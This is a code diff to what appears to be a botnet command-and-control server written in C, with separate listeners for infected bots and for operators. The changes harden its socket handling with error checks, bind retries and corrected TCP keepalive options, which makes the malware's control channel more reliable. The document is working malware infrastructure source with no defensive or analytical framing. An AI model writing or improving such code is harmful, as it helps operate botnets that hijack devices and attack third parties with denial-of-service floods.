@@ -123,28 +123,66 @@ void* handle_bot(void* arg) {
 void* bot_listener(void* arg) {
     int botport = *((int*)arg);
     int bot_server_socket = socket(AF_INET, SOCK_STREAM, 0);
-    if (bot_server_socket < 0) return NULL;
+    if (bot_server_socket < 0) {
+        perror("Failed to create bot server socket");
+        return NULL;
+    }
+
     int optval = 1;
-    setsockopt(bot_server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
-    setsockopt(bot_server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+    if (setsockopt(bot_server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0 ||
+        setsockopt(bot_server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
+        perror("Failed to set socket options");
+        close(bot_server_socket);
+        return NULL;
+    }
     
+    #ifdef TCP_KEEPIDLE
     int keepalive_time = 30;
-    int keepalive_intvl = 5;  
-    int keepalive_probes = 5; 
-    setsockopt(bot_server_socket, SOL_SOCKET, TCP_KEEPIDLE, &keepalive_time, sizeof(keepalive_time));
-    setsockopt(bot_server_socket, SOL_SOCKET, TCP_KEEPINTVL, &keepalive_intvl, sizeof(keepalive_intvl));
-    setsockopt(bot_server_socket, SOL_SOCKET, TCP_KEEPCNT, &keepalive_probes, sizeof(keepalive_probes));
+    if (setsockopt(bot_server_socket, IPPROTO_TCP, TCP_KEEPIDLE, &keepalive_time, sizeof(keepalive_time)) < 0) {
+        perror("Warning: Failed to set TCP_KEEPIDLE");
+    }
+    #endif
+
+    #ifdef TCP_KEEPINTVL
+    int keepalive_intvl = 5;
+    if (setsockopt(bot_server_socket, IPPROTO_TCP, TCP_KEEPINTVL, &keepalive_intvl, sizeof(keepalive_intvl)) < 0) {
+        perror("Warning: Failed to set TCP_KEEPINTVL");
+    }
+    #endif
+
+    #ifdef TCP_KEEPCNT
+    int keepalive_probes = 5;
+    if (setsockopt(bot_server_socket, IPPROTO_TCP, TCP_KEEPCNT, &keepalive_probes, sizeof(keepalive_probes)) < 0) {
+        perror("Warning: Failed to set TCP_KEEPCNT");
+    }
+    #endif
     
     struct sockaddr_in bot_server_addr;
     memset(&bot_server_addr, 0, sizeof(bot_server_addr));
     bot_server_addr.sin_family = AF_INET;
     bot_server_addr.sin_addr.s_addr = INADDR_ANY;
     bot_server_addr.sin_port = htons(botport);
-    if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) < 0) {
+
+    int bind_attempts = 3;
+    while (bind_attempts--) {
+        if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) == 0) {
+            break;
+        }
+        if (bind_attempts > 0) {
+            perror("Bind failed, retrying");
+            sleep(1);
+            continue;
+        }
+        perror("Failed to bind bot port");
         close(bot_server_socket);
         return NULL;
     }
-    listen(bot_server_socket, MAX_BOTS);
+
+    if (listen(bot_server_socket, MAX_BOTS) < 0) {
+        perror("Failed to listen on bot port");
+        close(bot_server_socket);
+        return NULL;
+    }
 
     while (1) {
         struct sockaddr_in client_addr;
@@ -160,9 +198,21 @@ void* bot_listener(void* arg) {
         }
 
         setsockopt(*bot_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
-        setsockopt(*bot_socket, SOL_SOCKET, TCP_KEEPIDLE, &keepalive_time, sizeof(keepalive_time));
-        setsockopt(*bot_socket, SOL_SOCKET, TCP_KEEPINTVL, &keepalive_intvl, sizeof(keepalive_intvl));
-        setsockopt(*bot_socket, SOL_SOCKET, TCP_KEEPCNT, &keepalive_probes, sizeof(keepalive_probes));
+        
+        #ifdef TCP_KEEPIDLE
+        int keepalive_time = 30;
+        setsockopt(*bot_socket, IPPROTO_TCP, TCP_KEEPIDLE, &keepalive_time, sizeof(keepalive_time));
+        #endif
+        
+        #ifdef TCP_KEEPINTVL
+        int keepalive_intvl = 5;
+        setsockopt(*bot_socket, IPPROTO_TCP, TCP_KEEPINTVL, &keepalive_intvl, sizeof(keepalive_intvl));
+        #endif
+        
+        #ifdef TCP_KEEPCNT
+        int keepalive_probes = 5;
+        setsockopt(*bot_socket, IPPROTO_TCP, TCP_KEEPCNT, &keepalive_probes, sizeof(keepalive_probes));
+        #endif
 
         char archbuf[64] = {0};
         fd_set readfds;
@@ -348,20 +398,46 @@ void* manage_cooldown(void* arg) {
 void* cnc_listener(void* arg) {
     int cncport = *((int*)arg);
     int server_socket = socket(AF_INET, SOCK_STREAM, 0);
-    if (server_socket < 0) return NULL;
+    if (server_socket < 0) {
+        perror("Failed to create CNC server socket");
+        return NULL;
+    }
+
+    int optval = 1;
+    if (setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0 ||
+        setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
+        perror("Failed to set CNC socket options");
+        close(server_socket);
+        return NULL;
+    }
+
     struct sockaddr_in server_addr;
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = INADDR_ANY;
     server_addr.sin_port = htons(cncport);
-    int optval = 1;
-    setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
-    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+
+    int bind_attempts = 3;
+    while (bind_attempts--) {
+        if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
+            break;
+        }
+        if (bind_attempts > 0) {
+            perror("CNC bind failed, retrying");
+            sleep(1);
+            continue;
+        }
+        perror("Failed to bind CNC server socket");
         close(server_socket);
         return NULL;
     }
-    listen(server_socket, 16);
+
+    if (listen(server_socket, 16) < 0) {
+        perror("Failed to listen on CNC server socket");
+        close(server_socket);
+        return NULL;
+    }
+
     while (1) {
         struct sockaddr_in client_addr;
         socklen_t client_len = sizeof(client_addr);
